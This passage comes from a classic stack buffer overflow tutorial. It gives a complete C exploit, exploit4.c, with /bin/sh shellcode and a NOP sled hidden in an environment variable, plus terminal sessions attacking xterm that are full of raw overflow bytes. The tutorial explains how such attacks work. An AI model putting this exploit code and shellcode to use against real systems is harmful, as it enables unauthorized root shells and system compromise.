\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH \u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bf H\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff \u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff Warning: some arguments in previous message were lost Illegal instruction [aleph1]$ exit . . . [aleph1]$ ./exploit4 2148 600 Using address: 0xbffffb54 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"\u00eb^1\u00a4FF \u00b0 \u00f3V \u00a41\u00a4\u00d8@\u00a4\u00e8\u00dc\u00ff\u00ff\u00ff/bin/sh\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb \u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT \u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bf T\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff \u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff Warning: some arguments in previous message were lost bash$ ------------------------------------------------------------------------------ Eureka! Less than a dozen tries and we found the magic numbers. If xterm where installed suid root this would now be a root shell. Small Buffer Overflows ~~~~~~~~~~~~~~~~~~~~~~ There will be times when the buffer you are trying to overflow is so small that either the shellcode wont fit into it, and it will overwrite the return address with instructions instead of the address of our code, or the number of NOPs you can pad the front of the string with is so small that the chances of guessing their address is minuscule. To obtain a shell from these programs we will have to go about it another way. This particular approach only works when you have access to the program's environment variables. What we will do is place our shellcode in an environment variable, and then overflow the buffer with the address of this variable in memory. This method also increases your changes of the exploit working as you can make the environment variable holding the shell code as large as you want. The environment variables are stored in the top of the stack when the program is started, any modification by setenv() are then allocated elsewhere. The stack at the beginning then looks like this: <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp> Our new program will take an extra variable, the size of the variable containing the shellcode and NOPs. Our new exploit now looks like this: exploit4.c ------------------------------------------------------------------------------ #include <stdlib.h> #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 #define DEFAULT_EGG_SIZE 2048 #define NOP 0x90 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_esp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr, *egg; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i, eggsize=DEFAULT_EGG_SIZE; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (argc > 3) eggsize = atoi(argv[3]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } if (!(egg = malloc(eggsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_esp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; ptr = egg; for (i = 0; i < eggsize - strlen(shellcode) - 1; i++) *(ptr++) = NOP; for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; egg[eggsize - 1] = '\\0'; memcpy(egg,\"EGG=\",4); putenv(egg); memcpy(buff,\"RET=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ Lets try our new exploit with our vulnerable test program: ------------------------------------------------------------------------------ [aleph1]$ ./exploit4 768 Using address: 0xbffffdb0 [aleph1]$ ./vulnerable $RET $ ------------------------------------------------------------------------------ Works like a charm. Now lets try it on xterm: ------------------------------------------------------------------------------ [aleph1]$ export DISPLAY=:0.0 [aleph1]$ ./exploit4 2148 Using address: 0xbffffdb0 [aleph1]$ /usr/X11R6/bin/xterm -fg $RET Warning: Color name \"\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4 \u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0 \u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf \u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff \u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4